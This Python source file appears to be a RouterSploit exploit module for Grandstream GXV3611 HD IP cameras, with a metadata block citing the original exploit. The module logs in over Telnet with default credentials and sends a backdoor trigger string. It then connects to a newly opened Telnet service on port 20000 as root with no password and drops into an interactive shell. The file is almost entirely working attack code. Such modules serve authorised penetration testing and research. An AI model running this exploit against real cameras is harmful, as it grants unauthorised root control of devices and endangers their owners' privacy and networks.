from routersploit.core.exploit import *
from routersploit.core.telnet.telnet_client import TelnetClient


class Exploit(TelnetClient):
    __info__ = {
        "name": "Grandsteam GXV3611 HD - Backdoor",
        "description": "Module exploits an SQL injection vulnerability in Grandstream GXV3611_HD IP cameras. "
                       "After the SQLI is triggered, the module opens a backdoor on TCP/20000 and connects to it.",
        "authors": (
            "pizza1337",       # exploit author
            "Joshua Abraham",  # routesploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/40441/",
            "http://boredhackerblog.blogspot.com/2016/05/hacking-ip-camera-grandstream-gxv3611hd.html",
        ),
        "devices": (
            "Grandstream GXV3611 HD",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(23, "Target Telnet port")

    username = OptString("admin")
    password = OptString("")

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable...")

            telnet_client = self.telnet_create()
            telnet_client.login(self.username, self.password)

            print_status("Triggering backdoor to start telnet server")
            telnet_client.read_until("> ")
            telnet_client.write("!#/ port lol\r\n")  # Backdoor command triggers telnet server to startup.
            telnet_client.read_until("> ")
            telnet_client.write("quit\r\n")
            telnet_client.close()

            print_success("SQLI successful, going to telnet into port 20000 "
                          "with username root and no password to get shell")

            telnet_client = self.telnet_create(port=20000)
            if telnet_client.login():
                telnet_client.interactive()

        else:
            print_error("Exploit failed. Target does not appear vulnerable")

    @mute
    def check(self):
        telnet_client = self.telnet_create()
        telnet_client.connect()

        res = telnet_client.read_until("login:")
        if res and "Grandstream" in res:
            return True

        return False
